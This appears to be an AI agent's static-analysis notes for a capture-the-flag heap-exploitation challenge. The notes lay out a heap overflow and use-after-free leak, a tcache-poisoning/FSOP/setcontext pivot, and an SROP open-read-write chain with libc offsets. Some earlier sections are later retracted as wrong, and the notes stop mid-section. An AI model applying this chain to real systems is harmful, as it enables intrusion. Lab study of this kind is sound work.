# Pwn/arbitragedb — 靜態分析筆記

> 分析環境：Windows + objdump/readelf（本機無法執行 ELF）。
> 以下位址均為**檔案偏移 / PIE 基底相對位址**，實際執行需加上 PIE base。

## 1. 保護機制

```
ELF 64-bit PIE, dynamically linked, stripped
FLAGS   = BIND_NOW          → Full RELRO（GOT 唯讀，不能改 GOT）
FLAGS_1 = NOW PIE           → PIE 開啟，需 leak
GNU_STACK = RW（無 E）      → NX 開啟
__stack_chk_fail 有 import  → Canary 開啟
```

libc：**Ubuntu GLIBC 2.43-2ubuntu2.3**（很新，`GNU C Library ... stable release version 2.43.`）
編譯器：GCC (Ubuntu 13.3.0-6ubuntu2~24.04)

**Full RELRO + PIE + NX + Canary 全開** → 需要 info leak + ROP，不能改 GOT。

## 2. 指令介面

`main` @ `0x6a03`：`fgets(buf, 0x1008, stdin)` 進 `0x1010` 的 stack buffer，
prompt 為 `adb> `，dispatch @ `0x6b07`：

| 指令 | handler | 說明 |
|---|---|---|
| `QUIT` | — | 離開 |
| `IMPORT ...` | `0x4988` | **漏洞在這**（見下） |
| `FILECHECK <name>` | `0x41a9` | 讀 `.chk` 檔算 HMAC |
| 其餘 | `0x67f8` | SELECT 查詢（`SELECT 1` / `sys_imports` / `sys_tables` / `FROM <table>` …） |

啟動時 `argc` 必須為 2，argv[1] 是 state 目錄（否則印 `internal`）。

## 3. seccomp（重要：決定 exploit 形態）

`0x30e5` 安裝 seccomp BPF。**若環境變數 `ADB_NO_SECCOMP` 存在則整個跳過**
（`getenv` @ `0x3103`，遠端當然沒有，本地測試可用它關掉）。

allowlist（`SECCOMP_RET_ALLOW = 0x7fff0000`），預設動作 `0x50001`
= `SECCOMP_RET_ERRNO | EPERM`（**不是 KILL**，syscall 只會回 -EPERM）：

```
0   read          1   write         3   close        5   fstat
8   lseek         12  brk           15  rt_sigreturn
60  exit          231 exit_group
257 openat        262 newfstatat
```

→ **沒有 execve / execveat，沒有 mmap / mprotect。**
→ 題目說「RCE」，但實際只能做 **open + read + write 的 ROP chain（ORW）**
   把 `/home/arbitragedb/flag` 讀出來印到 stdout。不能拿 shell。
→ 沒有 mprotect ⇒ **不能跳去 shellcode**，必須純 ROP（或 SROP，`rt_sigreturn` 有開）。
→ `open`(2) **沒開**，只有 `openat`(257)。用 `openat(AT_FDCWD=-100, path, 0, 0)`。

## 4. 主漏洞：IMPORT 的 heap overflow（clamp 後用 max 當 memcpy 長度）

### 4.1 IMPORT 前半是安全的

`0x4988` handler：

```c
sscanf(line, "IMPORT %63s FORMAT ADB1 SIZE %ld", name, &size);   // 0x4a0a
if (ret != 2 || size < 0 || size > 0x4000) → "import" 錯誤       // 0x4a1e~0x4a3c
buf = malloc(size);                                              // 0x4a5c
fread(buf, 1, size, stdin);  必須剛好讀滿 size                    // 0x4aa3
if (size <= 0x11 || memcmp(buf, "ADB1", 4) != 0) → 錯誤          // 0x4ae0~0x4afc
off = 0x10;   // 跳過 16 byte header
```

接著解三個 LEB128 varint（decoder @ `0x44bb`，bounded、最多 10 bytes，安全）：

```c
varint(buf+off, size-off, &adv, &A);   off += adv;   // 0x4b65  → A
B = parse_rec(buf+off, size-off, &adv);              // 0x4bbc  → B（0x4566）
varint(buf+off, size-off, &adv, &C);   off += adv;   // 0x4bfe  → C
if (off >= size || C > 0x80) → 錯誤                  // 0x4c32~0x4c49
handle(name, buf+off, size-off, B, C);               // 0x4c94  → 0x4604
```

### 4.2 漏洞在 `0x4604`

參數：`rdi`=name, `rsi`=payload, `rdx`=**remaining = size-off**, `rcx`=B, `r8`=C

```c
alloc = B + 0x18;                      // 0x4624
if (alloc > 0x1000) alloc = 0x1000;    // 0x4630  ← 配置量被 clamp 到 0x1000
p = malloc(alloc);                     // 0x4649
memset(p, 0, alloc);

copylen = C;                           // 0x4672
if (remaining >= copylen)              // 0x467a  cmp remaining, copylen / jae
    copylen = remaining;               // 0x4684  ← 取「較大者」，不是較小者！
memcpy(p, payload, copylen);           // 0x469e  ★ HEAP OVERFLOW
```

**`alloc` 被 clamp 到 0x1000，但 `copylen` 取的是 `max(remaining, C)`。**
`remaining` 完全由攻擊者控制（IMPORT SIZE 最大 0x4000），只要讓
`remaining > 0x1000`，就能溢出 heap chunk 最多約 **0x3000 bytes 的任意內容**。

### 4.3 觸發條件（全部可滿足）

- `size` 上限 0x4000 → `remaining` 可達約 0x3fe0
- `C <= 0x80` 的檢查**不影響 copylen**，因為走的是 `remaining` 那條路
- `B` 只影響 `alloc`，設小一點（例如 0）讓 `alloc = 0x18`，溢出更多
- 溢出內容 = payload 尾段，**完全可控、無 bad char 限制**（是 fread 讀進來的 raw binary）

### 4.4 溢出後發生什麼

`0x4604` 後續會把資料搬進 **BSS 的全域陣列**（不是 heap）：
- import 記錄表 @ `0x1ee5d70`（stride 0x78，上限 16 筆，counter @ `0x1ee64f8`）
- sys_imports 表 @ `0x1ee4170`（stride 0x38，上限 128 筆，counter @ `0x1ee5d70`）
- 結尾 `free(p)`（`0x497b`）

所以溢出目標是**同一 heap arena 裡相鄰 chunk 的 metadata**，
之後的 `free(p)` / 後續 `malloc` 就是 glibc 2.43 的 heap exploitation。

## 5. 其他已檢查、確認安全的路徑

- **FILECHECK**（`0x41a9`）：路徑驗證器 `0x40e7` 要求檔名長度**剛好 0x44**，
  前 64 字元必須是 hex（`isxdigit` 等價檢查），後綴必須是 `.chk`
  → **無法 path traversal**。檔案大小限制 0x1000 進 0x1010 buffer，安全。
  用 `openat(dirfd, ...)` 相對於啟動時存的 state 目錄 fd（`0x1ee6500`）。
- **varint decoder**（`0x44bb`）：有 bounds check（`>= len` 或 `> 9` 就 fail），安全。
- **SELECT** 查詢路徑：目前看是 whole-string `strcmp`/`strcasestr` 比對固定字串，
  沒有動態格式字串。`printf` 的 format 都是 rodata 常數 → 無 format string bug。
- `formal_state/` 下的檔案（TSV / .bti / .adb / .chk）都是**啟動時讀的正常資料**，
  `.bti` 內容只是 `generated covering index placeholder`，不是二進位結構。
  遠端我們無法改這些檔案 → **攻擊面只有 stdin 的指令**，parser fuzzing 方向可以收掉。

## 6. Exploit 路線（待 pc_agent 動態驗證）

1. **Leak**：需要 PIE base + libc base。候選管道是把溢出寫進相鄰 chunk 後，
   透過 `SELECT ... sys_imports`（`0x54ce`）把 BSS/heap 內容印出來。
   → 待動態確認 `sys_imports` 印了哪些欄位、能不能印出指標。
2. **Control flow**：Full RELRO 不能改 GOT；沒有 mprotect 不能放 shellcode。
   → 目標是劫持 **stack return address**（heap overflow → 某個指標 → 寫 stack），
     或 glibc 2.43 的 house-of-* / tcache poisoning 打 `__libc_argv` / 環境。
3. **Final payload**：ORW ROP chain
   ```
   openat(AT_FDCWD, "/home/arbitragedb/flag", O_RDONLY, 0)
   read(fd, buf, 0x100)
   write(1, buf, 0x100)
   ```
   （`rt_sigreturn` 有開 → SROP 是備案，可以一次設好所有暫存器）

## 7. 給 pc_agent 的動態分析需求

見 status.md / SendMessage 內容。重點：
- 用 `ADB_NO_SECCOMP=1` 先在無 seccomp 下驗證 crash 與 leak，再開 seccomp 驗證 ORW
- 跑法：`./arbitragedb formal_state`（argv[1] 必須是 state 目錄）
- 用題目附的 libc/ld：`patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . arbitragedb`

---

## 8. ★ Leak 管道：`SELECT ... sys_imports` 是 arbitrary read primitive

### 8.1 import 記錄結構（stride 0x78，BSS @ `0x1ee5d70 + 8`）

從 `sub_4604`（寫入）與 `sub_54ce`（列印）交叉比對得出：

| offset | 內容 | 在 sys_imports 怎麼被印出來 |
|---|---|---|
| `+0x00` | batch_id | `int:%ld` |
| `+0x08` | table_name char[0x18] | `%s`（`sub_1b40` 複製，上限 0x100） |
| `+0x20` | accepted_rows | `int:%ld` |
| `+0x28` | **sample 長度** | 傳給 encoder 當 len（encoder 內再 cap 到 0x100） |
| `+0x30` | inline sample buffer（0x20 bytes） | 當 `+0x50` 為 0 時的 fallback 來源 |
| `+0x50` | **sample 指標** | **非 0 就當成來源位址讀取** ★ |
| `+0x58` | aux 指標（0x80 的 chunk） | — |
| `+0x60`/`+0x68`/`+0x70` | payload ptr / remaining / C | — |

### 8.2 列印邏輯（`sub_54ce` @ `0x5604`~`0x563f`）

```c
len = rec[0x28];
src = rec[0x50] ? rec[0x50] : rec + 0x30;     // 0x5613 test/je
hex_encode(src, len, out, 0x280);             // sub_1c10
printf("ROW int:%ld %s int:%ld %s", rec[0], table_name, rec[0x20], "blob:<len>:<hex>");
```

encoder `sub_1c10`：`if (len > 0x100) len = 0x100;`（`0x1c4a`）然後
`hex(src, len)` → `blob:%zu:%s`。**沒有任何指標合法性檢查。**

### 8.3 這給了什麼

**控制 `rec[0x50]`（來源位址）+ `rec[0x28]`（長度）⇒ 每次可讀任意位址 0x100 bytes
並以 hex 印出來。** 這正是 PIE + Full RELRO 需要的 leak 原語。

而 `+0x50` / `+0x28` 都落在 heap overflow 可覆寫的範圍內
（記錄本身在 BSS，但 `+0x50` 存的是**指向 heap 的指標**，見下）。

### 8.4 免費的 heap leak（不用溢出就有）

`sub_4604` 的 `0x47ed` 分支：**當 `B != C` 時**會走
```c
q = malloc(0x520);  aux = malloc(0x80);
memcpy(q, payload, min(copylen, 0x80));
rec[0x50] = q;        // 0x485e  ← 存入 heap 指標
rec[0x28] = 0x20;     // 0x486a  ← 長度固定 0x20
rec[0x58] = aux;
free(q);              // 0x4889  ★ q 被 free 了，但 rec[0x50] 還指著它 → UAF
```

⚠️ **注意 `0x4889` 的 `free(q)`：`rec[0x50]` 變成 dangling pointer（UAF）。**
之後 `SELECT ... sys_imports` 會把這塊已釋放的 chunk 內容 hex 印出來
→ **tcache/fastbin 的 fd/key 指標會被直接印出來 ⇒ 免費的 heap base leak**
（glibc 2.43 有 tcache key 與 pointer mangling，印出來的是
 `mangled_fd = (chunk_addr >> 12) ^ next`，仍可推回 heap base）

這條路**不需要任何溢出**，只要送一個 `B != C` 的合法 IMPORT 再 `SELECT ... sys_imports`。
**請 pc_agent 優先驗證這點**，這是整條 exploit 最省事的起點。

### 8.5 完整 exploit 草案

1. **heap leak**：IMPORT（`B != C`，varint#2 須 >= 0x80）→ `SELECT * FROM sys_imports;` → 讀 freed chunk 的 fd
   → 解 mangling 得 heap base
2. **libc leak**：用 heap overflow 覆寫某筆記錄的 `+0x50` / `+0x28`
   → 指向有 libc 指標的位置（例如 main_arena / stdout FILE 結構 / `__libc_argv`）
   → 再 `SELECT ... sys_imports` 印出來 → libc base
   （也可先讓 chunk 進 unsorted bin，其 fd/bk 直接指向 main_arena）
3. **PIE leak**：同法讀 BSS 裡存的程式指標，或從 stdout FILE 的 vtable 推回
4. **劫持控制流**：glibc 2.43 tcache poisoning（注意 pointer mangling + tcache key）
   → 目標是 stack return address（沒有 mprotect 不能放 shellcode，GOT 唯讀）
5. **ORW ROP**：`openat(-100, "/home/arbitragedb/flag", 0, 0)` → `read` → `write(1,...)`
   備案：`rt_sigreturn` 有開 → SROP 一次設好所有暫存器

---

## 9. 數量限制與 heap grooming 空間

- **import 記錄上限 16 筆**（`0x46a3`：`cmp $0xf` / `ja`），counter @ `0x1ee64f8`
- **sys_imports 記錄上限 128 筆**（`0x48a8`：`cmp $0x7f`），counter @ `0x1ee5d70`
- 兩者都**只增不減、沒有清除機制** → 一個連線裡最多 16 次有效 IMPORT

含意：
- 16 筆記錄足夠做 heap grooming（每次 IMPORT 可控制 `malloc(min(B+0x18,0x1000))`
  的大小，等於能自由挑 tcache bin）
- 超過 16 筆之後 `sub_4604` 會跳過記錄建立，但**前半的 malloc/memcpy 仍會執行**
  → 溢出原語在用完 16 筆之後**仍然可用**（只是不再新增可讀的記錄）
- 每次 IMPORT 結束都會 `free(p)`（`0x497b`）與 `free(q)`（`0x4889`，B!=C 時）
  → 可自由把 chunk 餵進 tcache / fastbin，這是 tcache poisoning 的基礎

## 10. 目前仍待動態驗證的假設（給 Linux 環境）

| # | 假設 | 為什麼重要 | 怎麼驗 |
|---|---|---|---|
| 1 | B!=C 分支的 `free(q)` 造成的 UAF 能透過 sys_imports 印出 tcache fd/key | 免費 heap leak，整條 exploit 的起點 | 送合法 B!=C 的 IMPORT（varint#2 >= 0x80）→ `SELECT * FROM sys_imports;`，看 blob hex |
| 2 | 溢出能覆寫到下一筆記錄的 `+0x50`/`+0x28` 或相鄰 chunk header | 決定能否升級成 arbitrary read | **stage1.py**（不是 gen_poc.py，那支語法與參數都錯）+ gdb 看 heap 佈局 |
| 3 | 能讓某 chunk 進 unsorted bin 讓 fd/bk 指向 main_arena | libc leak | 配置 > 0x410 的 chunk 再 free |
| 4 | glibc 2.43 的 tcache poisoning 是否仍可行（mangling + key 檢查） | 決定劫持手法 | 實機測試 |

**注意**：`alloc = min(B+0x18, 0x1000)`，所以單次最大只能配 0x1000；
要進 unsorted bin（需 > tcache 上限 0x410）是做得到的（B 設 0x400 左右）。

---

## 11. 控制流劫持目標分析（靜態，回應 tcache alignment 提醒）

### 11.1 先確認哪些東西是唯讀的

```
GNU_RELRO  0x128cb8 .. 0x129000   ← 執行期唯讀
  [21] .init_array  0x128cb8      ✗ 在 RELRO 內，不能寫
  [22] .fini_array  0x128cc0      ✗ 在 RELRO 內，不能寫
  [24] .got         0x128eb8      ✗ 在 RELRO 內，BIND_NOW → 全部唯讀
  [25] .data        0x129000      ✓ 可寫（只有 0x10 bytes）
  [26] .bss         0x129020..    ✓ 可寫（約 31MB）
```

**結論：GOT / init_array / fini_array 全部打不了**（Full RELRO 名副其實）。
全域也沒有任何存在可寫記憶體的 function pointer
（掃過所有 `callq *` / `jmpq *`，除了 PLT 就只有 `0x1014` 的 `callq *%rax`，
那是 `_init` 裡的 `__gmon_start__`，執行期碰不到）。

### 11.2 Canary 狀況

掃過所有 frame >= 0x100 的函式，**全部都有 canary**（都有 `mov %fs:0x28,%rax`）：
`sub_6a03`(main, 0x1000) / `sub_41a9`(FILECHECK, 0x1000) / `sub_2e76`(0x1000) /
`sub_54ce`(0x340) / `sub_62b8`(0x340) / `sub_1cd1`(0x520) / 各 SELECT handler(0x440)…

→ 想蓋 return address 就**必須先 leak canary**。
   但我們有 arbitrary read（第 8 節），可以直接讀 TLS 的 canary
   （`fs:0x28`，位於 TCB；heap leak → 推 TLS 位址 → 讀出來），所以這條路仍然通。

### 11.3 ★ 更好的目標：stdout / stdin FILE* 在 .data，**不在 RELRO 內**

```
0x129020  stdout  FILE*   ← 可寫
0x129030  stdin   FILE*   ← 可寫
```

程式大量使用 `printf` / `puts` / `fgets` / `fflush`（`sub_6b93` 每跑完一條指令就
`fflush`），且 `main` 開頭對兩者呼叫 `setvbuf`（`0x6a50`/`0x6a6e`）。

→ **FSOP（File Stream Oriented Programming）是比蓋 return address 更乾淨的路線**：
   用 overflow / tcache poisoning 把 `0x129020` 改成指向偽造的 FILE 結構
   （偽造結構可以放在 heap 上，位址由 UAF leak 得知），
   下一次 `fflush`/`printf` 就會走我們控制的 vtable。
   **完全不需要 canary leak**。

⚠️ 但 glibc 2.43 對 FILE vtable 有 `_IO_validate_vtable` 檢查（vtable 必須落在
`__io_vtables` 區段內），所以要用 `_IO_wfile_jumps` / `_IO_str_jumps` 那類
合法 vtable 搭配 `_wide_data` 的手法，而不是隨便指一個位址。
這點需要在實機上對著這份 libc 2.43 確認可用的 gadget。

### 11.4 tcache poisoning 的對齊限制（planner 提醒，已確認需納入）

glibc 2.14+ 的 tcache：
- `e->next` 有 **pointer mangling**：`next_mangled = (chunk_addr >> 12) ^ next`
  → 要偽造 next 必須先知道 chunk 位址（heap leak，第 8.4 節可拿到）
- 有 **`e->key` double-free 檢查**
- **`tcache_get` 會檢查對齊**：取出的 chunk 必須 16-byte aligned，
  否則 `malloc(): unaligned tcache chunk detected` 直接 abort

→ 所以 tcache poisoning 的目標位址**必須 16-byte 對齊**。
  `0x129020`(stdout) 與 `0x129030`(stdin) **都是 16-byte 對齊的**，✓ 可作為目標。
  （`0x129020 % 0x10 == 0`，`0x129030 % 0x10 == 0`）
  要蓋 stack return address 的話也要挑對齊的落點，通常配合「蓋一個 16-byte 對齊的
  區域、讓 ret addr 落在其中」來處理。

### 11.5 修正後的建議路線（優先序）

1. **UAF heap leak**（第 8.4 節）→ heap base
2. **libc leak**：B≈0x400 配一個 > 0x410 的 chunk → free 進 unsorted bin
   → fd/bk 指向 main_arena → 用 UAF/arbitrary read 印出來 → libc base
3. **劫持**：二選一
   - **(推薦) FSOP**：tcache poisoning 目標 `0x129020`(stdout)，16-byte 對齊 ✓，
     改成指向 heap 上偽造的 FILE → 下次 `fflush` 觸發
   - **(備案) 蓋 return address**：需額外用 arbitrary read 撈 canary
4. **ORW ROP / SROP**：`openat(-100,"/home/arbitragedb/flag",0,0)` → `read` → `write(1)`
   （`rt_sigreturn` 有開，SROP 可一次設好暫存器，在 gadget 不足時特別好用）

---

## 12. ORW chain 已建好（`rop.py`），關鍵發現：**libc 沒有 `pop rdx`**

用題目附的 libc.so.6 掃 `.text`（vaddr `0x287c0`, size `0x197159`）：

| gadget | offset | 狀況 |
|---|---|---|
| `syscall; ret` | `0x0a0be6`, `0x0a0c05`, `0xaca80` | ✓ |
| `pop rdi; ret` | `0x11bc7a` | ✓ |
| `pop rsi; ret` | `0x05c2e7` | ✓ |
| `pop rax; ret` | `0x0e5dc7` | ✓ |
| `ret` | `0x0289fe` | ✓ |
| `mov rdx,rax; ret` | `0x146257` | ✓ |
| **`pop rdx; ret`** | — | ❌ **完全找不到** |
| `pop rdx; pop rbx/rsi/rcx/r12; ret` | — | ❌ 也都沒有 |

**沒有 `pop rdx` ⇒ `read`/`write` 的第三個參數（長度）用純 ROP 很難設。**

→ 所以 **主線改走 SROP**（`rt_sigreturn` = syscall 15，**已被 seccomp 允許**）：
   一個 sigframe 就把 rax/rdi/rsi/rdx/rip/rsp 全部一次設好，完全不需要湊 gadget。
   這也是為什麼出題者刻意在 seccomp 裡留 `rt_sigreturn` —— 應該就是預期解法。

### 12.1 SROP frame 佈局（已在 `rop.py` 裡用 assert 自我驗證）

rt_sigreturn 時 `rsp` 必須指向 **ucontext 起點**：

```
+0x00 uc_flags   +0x08 uc_link   +0x10 uc_stack(24)
+0x28 起是 sigcontext：
   +0x28 r8   +0x30 r9   +0x38 r10  +0x40 r11  +0x48 r12  +0x50 r13
   +0x58 r14  +0x60 r15  +0x68 rdi  +0x70 rsi  +0x78 rbp  +0x80 rbx
   +0x88 rdx  +0x90 rax  +0x98 rcx  +0xa0 rsp  +0xa8 rip  +0xb0 eflags
   +0xb8 csgsfs(=0x33)   ...   +0xe0 fpstate(必須 0)
有效長度 = 0xe8
```

⚠️ 我第一版寫成 0x100 是錯的（多塞了 __reserved 尾巴），
`rop.py` 現在有 `assert SIGFRAME_OFF["rip"] == 0xa8` 等檢查防止再犯。

### 12.2 chain 大小

- 單個 SROP frame = `pop rax;15`(16) + `syscall`(8) + sigframe(0xe8) = **0x100**
- ORW 三步（openat → read → write）= **0x300 bytes**
- heap overflow 可寫約 0x1fe8 → **空間綽綽有餘** ✓

### 12.3 libc 函式 offset（dynsym 實測值）

```
openat  0x127c50    read  0x128310    write  0x128dd0
syscall 0x134c70    environ 0x219de8   ← environ 可拿 stack leak
_IO_file_jumps  0x211030      _IO_wfile_jumps  0x211228
```

`__io_vtables` 合法區間約 `0x211030`–`0x2116c0`（planner 從 stride 推導，
`_IO_file_jumps` / `_IO_wfile_jumps` 是 dynsym 實測值可直接用）
→ **FSOP 成立**，`_IO_wfile_jumps` 可安全指過去。

### 12.4 還需要的一塊：把 chain 放到哪、怎麼轉進去

SROP 需要 `rsp` 指到我們的 frame。兩個候選：
1. FSOP 觸發時若能控到 `rsp`（某些 `_IO_wfile_jumps` 手法可做 stack pivot）
2. 或先用 `environ`（`0x219de8`）arbitrary read 拿 stack 位址，
   再用 overflow 蓋 return address（但需 canary leak）

→ 這一步**必須動態驗證**，是目前唯一還沒收斂的環節。

---

## 13. ★ Stack pivot 已解決（靜態）：`setcontext+0x3d` 用 **rdx**，且與 SROP 共用同一套偏移

### 13.1 FSOP pivot 路徑上的符號（dynsym 實測值）

```
setcontext          0x04be80      swapcontext   0x05bea0    makecontext 0x04a0c0
_IO_wdoallocbuf     0x092020      _IO_wsetb            0x0919c0
_IO_switch_to_wget_mode 0x092190  _IO_wfile_underflow  0x0938c0
_IO_wfile_overflow  0x094110      _IO_wfile_xsputn     0x094e40
_IO_wfile_seekoff   0x094550      _IO_wfile_sync       0x0943b0
_IO_list_all        0x213480      _IO_2_1_stdout_      0x213580
_IO_2_1_stdin_      0x2128e0      _IO_wfile_jumps      0x211228
_IO_file_jumps      0x211030
```

### 13.2 setcontext 的 pivot gadget（已逐 byte 驗證）

`setcontext` 前段是 `rt_sigprocmask`，真正有用的入口在 **`setcontext+0x3d` = `0x4bebd`**：

```asm
0x4bebd:  48 8b a2 a0 00 00 00   mov rsp,[rdx+0xa0]     ← pivot！
0x4bec4:  48 8b 9a 80 00 00 00   mov rbx,[rdx+0x80]
0x4becb:  48 8b 6a 78            mov rbp,[rdx+0x78]
0x4becf:  4c 8b 62 48            mov r12,[rdx+0x48]
0x4bed3:  4c 8b 6a 50            mov r13,[rdx+0x50]
0x4bed7:  4c 8b 72 58            mov r14,[rdx+0x58]
0x4bedb:  4c 8b 7a 60            mov r15,[rdx+0x60]
   ...（FPU / shadow-stack 檢查）...
0x4bf84:  4c 8b 92 a8 00 00 00   mov r10,[rdx+0xa8]     ← 目標 rip
0x4bf8a:  48 8b 92 88 00 00 00   mov rdx,[rdx+0x88]
0x4bfa0:  41 52                  push r10
0x4bfa2:  c3                     ret                     ← 轉移控制
   後段還有：mov rsi,[rdx+0x70]; mov rdi,[rdx+0x68]; mov rcx,[rdx+0x98];
             mov r8,[rdx+0x28]; mov r9,[rdx+0x30]
```

### 13.3 ★ 這個發現為什麼重要

**(1) 是 `rdx` 版本，不是舊版的 `rdi` 版本。**
glibc 2.29 之後 setcontext 改讀 `rdx`。所以 FSOP 觸發時**必須讓 `rdx` 指向偽造的 ucontext**，
不是 `rdi`。這點如果搞錯整條 exploit 會直接死掉，而這是很常見的踩雷點。
→ `_IO_wfile_*` 那條路線剛好會把 `_wide_data`（我們可控的指標）帶進 `rdx`，
  這正是 FSOP + setcontext 常見組合可行的原因。**待動態確認 rdx 實際落點。**

**(2) 偏移跟 SROP 的 sigframe 完全一致。**

| 欄位 | SROP sigframe | setcontext 讀的 ucontext |
|---|---|---|
| rsp | `+0xa0` | `+0xa0` ✓ |
| rip | `+0xa8` | `+0xa8` ✓ |
| rdi | `+0x68` | `+0x68` ✓ |
| rsi | `+0x70` | `+0x70` ✓ |
| rdx | `+0x88` | `+0x88` ✓ |

→ **同一份偽造結構可以同時餵給 SROP 和 setcontext**，不用寫兩套。
  `rop.py` 的 `sigframe()` 直接就能當 setcontext 的 ucontext 用。

### 13.4 更新後的完整路線

```
1. UAF leak       合法 B!=C 的 IMPORT → SELECT sys_imports → heap base        [待 Q1]
2. libc leak      B≈0x400 → unsorted bin → fd/bk 指向 main_arena → 讀出       [待 Q1]
3. 寫 payload     用 overflow 把「偽造 FILE + ucontext + ORW chain」寫進 heap
4. 劫持           tcache poisoning 改 0x129020(stdout) → 偽造 FILE
                  vtable 指 _IO_wfile_jumps(0x211228)，讓它走到 setcontext+0x3d
5. pivot          setcontext 從 rdx 讀 ucontext → rsp 落到我們的 SROP chain
6. ORW            openat(-100,"/home/arbitragedb/flag",0,0) → read → write(1)
                  （沒有 pop rdx，全部用 SROP 設暫存器）
```

**唯一還需要動態確認的**：步驟 4→5 之間 `rdx` 實際會指到哪，
以及 glibc 2.43 的 `_IO_validate_vtable` 在這條路徑上的確切檢查點。

---

## 14. 四組 exploit 參數已靜態驗證可達（`stage1.py`）

把 `sub_4988`（IMPORT 解析）+ `sub_4604`（漏洞函式）的所有判斷條件用 Python 重現，
確認以下四組參數都能**通過全部檢查**並到達想要的分支：

| 目的 | A | B | C | payload | size | alloc | copylen | overflow | UAF 分支 |
|---|---|---|---|---|---|---|---|---|---|
| **純 UAF leak** | 1 | 0x20 | 0x10 | 0x20 | 0x33 | 0x38 | 0x20 | −0x18（不溢出） | ✓ |
| **純 overflow** | 1 | 0 | 0 | 0x2000 | 0x2013 | 0x18 | 0x2000 | **+0x1fe8** | ✗ |
| **UAF + overflow** | 1 | 0x400 | 0x80 | 0x2000 | 0x2015 | 0x418 | 0x2000 | **+0x1be8** | ✓ |
| **unsorted bin** | 1 | 0x500 | 0x10 | 0x40 | 0x54 | 0x518 | 0x40 | −0x4d8 | ✓ |

通過的檢查包含：`0 <= size <= 0x4000`、`size > 0x11`、`memcmp(buf,"ADB1",4)==0`、
`off < size`、`C <= 0x80`。（`stage1.py` 裡有 assert 把這些釘死。）

### 重要推論

1. **「UAF + overflow」可以在同一條 IMPORT 裡同時達成**（第三組）
   → 不需要分兩次、也不用擔心中間 heap 狀態變化。
2. **unsorted bin 可達**：`alloc` 上限雖然是 0x1000，但 `B=0x500` 給出 `alloc=0x518`，
   已超過 tcache 上限 0x410 → free 後會進 unsorted bin，其 `fd`/`bk` 指向 `main_arena`
   → **這是 libc leak 的來源**，而且同樣透過 `sys_imports` 的 blob 印出來。
3. 四組都遠低於 16 筆記錄上限，可以在同一個連線裡全部做完。

`stage1.py` 直接產生可餵給程式的 stdin（UAF → SELECT → unsorted → SELECT → QUIT），
並附 `parse_blob()` / `demangle()` / `recover_heap_base()` 幫忙解析輸出。

---

## 15. 🔴 重大修正：UAF 分支的開關是 `sub_4566` 的**截斷行為**，不是 B/C 相等與否

pc_agent 動態實測「A,B,C ∈ {0,1,2,0x40,0x7f} 全部組合都走 inline 路徑、開不了 UAF」，
我回頭重讀 caller 與 `sub_4566`，找到原因了。**我前面第 8/14 節把參數對應寫錯了。**

### 15.1 先更正參數對應（第 8/14 節的 B/C 命名是錯的）

`sub_4604(rdi=name, rsi=payload, rdx=remaining, rcx=arg4, r8=arg5)`

在 **caller**（`0x4c68`–`0x4c94`）：

```
rcx (arg4) = [rbp-0x58]   ← sub_4566(varint#2 起始處) 的回傳值   ★會截斷
r8  (arg5) = [rbp-0x78]   ← varint#3 的完整值（0x4bfe 的 sub_44bb）
rdx        = size - off   ← remaining
```

在 **callee**（`0x461c`/`0x4620`）：`-0x60 = rcx = arg4`、`-0x68 = r8 = arg5`。
所以 `0x47f1` 的閘門 `cmp [-0x60],[-0x68]` 比的是 **arg4 vs arg5**。

- `arg4` 決定 `alloc = min(arg4+0x18, 0x1000)`、也寫進 `rec[0x28]`（再 clamp 0x20）
- `arg5` 受 `0x4c43` 的 `<= 0x80` 檢查（**被檢查的是 arg5，不是 arg4**）
- `copylen = max(remaining, arg5)`

### 15.2 ★ `sub_4566` 的真正語意（關鍵）

```c
uint64_t sub_4566(const uint8_t *p, size_t len, size_t *adv) {
    uint64_t val; 
    if (varint_decode(p, len, adv, &val) != 0) { *adv = 0; return 0; }
    if (val > 1 && (p[0] & 0x80))      // 0x45ca: val>1   0x45d7: 首 byte 有 continuation bit
        return p[0] & 0x7f;            // ★ 只回「首 byte 的低 7 bits」
    return val;                        // 否則回完整值
}
```

**只有當 varint#2 是「多 byte 編碼」（首 byte ≥ 0x80）時，回傳值才會被截斷成低 7 bits。**
而 `off` 前進量用的是 `*adv`（完整 byte 數），與截斷無關。

### 15.3 為什麼 pc_agent 開不了 UAF

他試的 `{0, 1, 2, 0x40, 0x7f}` **全部都是單 byte varint**（< 0x80，首 byte 無 continuation bit）
→ `sub_4566` 回傳完整值 → `arg4 == varint#2`
→ 當他讓 varint#2 == varint#3 時 `arg4 == arg5`，UAF 閘門關閉；
   他直覺上「B != C」時其實也只是在比兩個完整值，沒碰到截斷這個機制。

**→ 要開 UAF，必須讓 varint#2 ≥ 0x80（多 byte），讓截斷發生，
   使 `arg4 = firstbyte & 0x7f` 與 `arg5` 不相等。**

### 15.4 可用參數（靜態驗證，含全部檢查）

| varint2 | varint3 | paylen | arg4 | arg5 | alloc | overflow | UAF |
|---|---|---|---|---|---|---|---|
| **0xff** | 0 | 0x20 | **127** | 0 | 0x97 | −119（不溢出） | ✓ |
| 0x3fff | 1 | 0x40 | 127 | 1 | 0x97 | −87 | ✓ |
| 0x81 | 0 | 0x20 | 1 | 0 | 0x19 | +7 | ✓ |
| 0x80 | 1 | 0x20 | 0 | 1 | 0x18 | +8 | ✓ |

**推薦第一組 `varint2=0xff, varint3=0, payload 0x20`**：UAF 開啟且確定不溢出，
最乾淨，適合單獨驗證 leak。

### 15.5 ⚠️ 一個結構性限制（影響 libc leak 計畫）

截斷後 `arg4 = firstbyte & 0x7f ≤ 0x7f`
→ **走 UAF 分支時 `alloc` 最大只有 `0x7f+0x18 = 0x97`**。

而 `alloc > 0x410` 才進 unsorted bin，那需要單 byte varint（arg4 可以大到 0x7f 以上？不行）
——實際上單 byte varint 上限也是 0x7f。**要 alloc 大必須讓 varint#2 的完整值大且不截斷，
但不截斷就代表單 byte，單 byte 上限 0x7f。**

→ **`alloc` 恆 ≤ 0x97，永遠進不了 unsorted bin。**
   第 14 節「B=0x500 → alloc=0x518 → unsorted bin 拿 libc leak」**這條路不成立，作廢。**
   （那一格是我用錯誤的參數模型算出來的。）
→ libc leak 必須改走別的路：UAF 分支裡 `malloc(0x520)` 的那顆 chunk 是固定 0x520，
   free 後進 tcache 0x520 bin（不是 unsorted），只給 heap 指標。
   **libc leak 要靠 arbitrary read 去讀已知含 libc 指標的位址**（例如 stdout FILE 結構）。

### 15.6 交叉驗證（為什麼相信這個模型）

用同一套模型跑 pc_agent 測過的單 byte 參數，能**完全重現**他的實測觀察：
- `rec[0x28] = arg4` 再 clamp 到 0x20 → inline sample 長度 = `min(arg4, 0x20)` ✓
